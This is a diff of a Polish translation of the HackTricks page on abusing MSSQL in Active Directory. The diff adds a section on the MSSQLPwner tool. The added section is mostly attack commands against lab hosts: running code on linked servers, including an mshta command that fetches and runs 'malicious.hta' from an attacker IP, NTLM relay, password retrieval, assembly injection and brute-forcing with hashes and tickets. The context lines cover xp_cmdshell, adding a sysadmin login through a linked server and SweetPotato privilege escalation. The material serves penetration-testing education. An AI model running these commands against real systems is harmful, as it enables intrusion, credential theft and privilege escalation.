@@ -1,16 +1,16 @@
 # MSSQL AD Abuse
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Wsparcie dla HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
@@ -19,9 +19,75 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 {% embed url="https://websec.nl/" %}
 
-## **MSSQL Enumeration / Discovery**
+## **MSSQL Enumeracja / Odkrywanie**
 
-Moduł powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) jest bardzo przydatny w tym przypadku.
+### Python
+Narzędzie [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) opiera się na impacket i pozwala również na uwierzytelnianie za pomocą biletów kerberos oraz atakowanie przez łańcuchy linków.
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### Enumerowanie z sieci bez sesji domenowej
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
+
+Moduł powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) jest w tym przypadku bardzo przydatny.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -79,9 +145,9 @@ Może być również możliwe **wykonywanie poleceń** wewnątrz hosta MSSQL
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the page mentioned in the **following section how to do this manually.**
+Sprawdź na stronie wspomnianej w **następnym rozdziale, jak zrobić to ręcznie.**
 
-### MSSQL Podstawowe Techniki Hackingowe
+### MSSQL Podstawowe Sztuczki Hackingowe
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -154,7 +220,7 @@ EXEC sp_linkedservers;
 
 #### Wykonaj zapytania w zaufanym linku
 
-Wykonaj zapytania przez link (przykład: znajdź więcej linków w nowo dostępnym instancji):
+Wykonaj zapytania przez link (przykład: znajdź więcej linków w nowej dostępnej instancji):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -186,9 +252,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **Użytkownik lokalny MSSQL** zazwyczaj ma specjalny rodzaj uprawnienia nazywanego **`SeImpersonatePrivilege`**. Umożliwia to kontu "podszywanie się pod klienta po uwierzytelnieniu".
 
-Strategią, którą opracowało wielu autorów, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej lub atakującej usłudze, którą tworzy napastnik. Ta fałszywa usługa jest w stanie podszywać się pod usługę SYSTEM, gdy ta próbuje się uwierzytelnić.
+Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej lub atakującej usłudze, którą tworzy napastnik. Ta fałszywa usługa jest w stanie podszywać się pod usługę SYSTEM, gdy ta próbuje się uwierzytelnić.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) ma zbiór tych różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w Beaconie.
+[SweetPotato](https://github.com/CCob/SweetPotato) ma zbiór tych różnych technik, które można wykonać za pomocą polecenia `execute-assembly` Beacona.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
